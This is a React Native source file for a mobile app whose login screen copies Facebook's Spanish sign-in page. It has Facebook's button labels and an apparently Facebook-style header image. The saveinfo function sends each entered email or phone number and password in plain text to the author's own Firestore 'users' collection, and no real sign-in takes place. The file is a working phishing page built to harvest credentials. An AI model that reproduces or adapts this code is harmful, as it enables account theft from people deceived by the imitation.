import { StatusBar } from 'expo-status-bar';
import React, { useState } from 'react';
import { StyleSheet, Text, View, Image, TextInput, Button, ScrollView, TouchableOpacity} from 'react-native';
import header from './assets/header.jpeg';
import firebase from './database/firebase';
import { collection, addDoc } from "firebase/firestore";

export default function App() {

  const [state, setState] = useState({
    email: '',
    password: '',
    coloremail: '#A7A8AB',
  });

  const captext = (name,value) =>{
    setState({...state,[name]:value,coloremail: '#053D87'});
  }

  const saveinfo = async () =>{

    if (state.email == '' || state.password == '') {

      console.log("Don't send")

    } else {

      const docRef = await addDoc(collection(firebase.db, "users"), {
        email: state.email,
        password: state.password
      });
      
      console.log("send");
    }

  }

  return (

    <ScrollView  style={styles.container}>

      <View>
      <StatusBar backgroundColor="#053D87"/>
      <Image source={header} style={styles.header}/>
      <Text style={styles.idiomas}>English • Français • <Text style={{color:'#5397E8'}}>Más...</Text> </Text>
      </View>
      
      <View  style={styles.username}>
      <TextInput onChangeText={(value)=>captext('email', value)} style={{marginBottom: 10, fontSize:18, color: '#fff'}} placeholder="Teléfono o Correo Electrónico" placeholderTextColor="#A7A8AB"/>
      </View>

      <View  style={styles.username2}>
      <TextInput onChangeText={(value)=>captext('password', value)} secureTextEntry={true} style={{marginBottom: 10, fontSize:18, color: '#fff'}} placeholder="Contraseña" placeholderTextColor="#A7A8AB"/>
      </View>

      <View style={styles.login}>
        <Button onPress={()=>{ saveinfo() }} title='Iniciar sesión'/>
      </View>

      <View style={{marginTop:30, marginBottom:30,}}>
        <Text style={{color:'#5397E8',textAlign:'center', fontSize:15}}>¿Olvidaste tu contraseña?</Text>
      </View>

    <View style={{flexDirection: 'row', marginHorizontal:40}}>

      <View style={{backgroundColor: '#A7A8AB', height: 1, flex: 1, alignSelf: 'center'}} />
      <Text style={{ alignSelf:'center', paddingHorizontal:5, fontSize: 15, color:'#A7A8AB' }}>O</Text>
      <View style={{backgroundColor: '#A7A8AB', height: 1, flex: 1, alignSelf: 'center'}} />

    </View>

    <View style={styles.create}>

      <TouchableOpacity style={{backgroundColor:'#31A34C', height:35, borderRadius:2}}>
        <Text style={{color:'#fff', textAlign:'center', marginTop:8.5, fontSize:15}}>Crear cuenta de Facebook</Text>
      </TouchableOpacity>
    
    </View>

    </ScrollView>

    
  );
}

const styles = StyleSheet.create({
  container: { 
    flex: 1,
    backgroundColor: "#242527",
  },
  header: {
    marginTop: 25,
    width: 357,
    height: 200, 
  },
  idiomas: {
    marginTop: 7,
    textAlign: "center",
    color: "#A7A8AB",
    fontSize: 15,
  },
  username: {
    flex: 1,
    color: "#A7A8AB",
    padding: 0,
    marginBottom: 0,
    borderBottomWidth: 1,
    borderBottomColor: '#A7A8AB',
    marginTop: 50,
    marginHorizontal: 40,
  },
  username2: {
    flex: 1,
    color: "#A7A8AB",
    padding: 0,
    marginBottom: 15,
    borderBottomWidth: 1,
    borderBottomColor: '#A7A8AB',
    marginTop: 25,
    marginHorizontal: 40,
  },

  login:{
    marginTop: 20,
    flex: 1,
    padding: 0,
    marginHorizontal: 40,
  },

  line:{
    flex:1,
    color: "#A7A8AB",
    padding: 0,
    borderBottomWidth: 1,
    borderBottomColor: '#A7A8AB',
  },

  create:{
    marginTop: 20,
    flex: 1,
    padding: 0,
    marginHorizontal: 60,
  },
})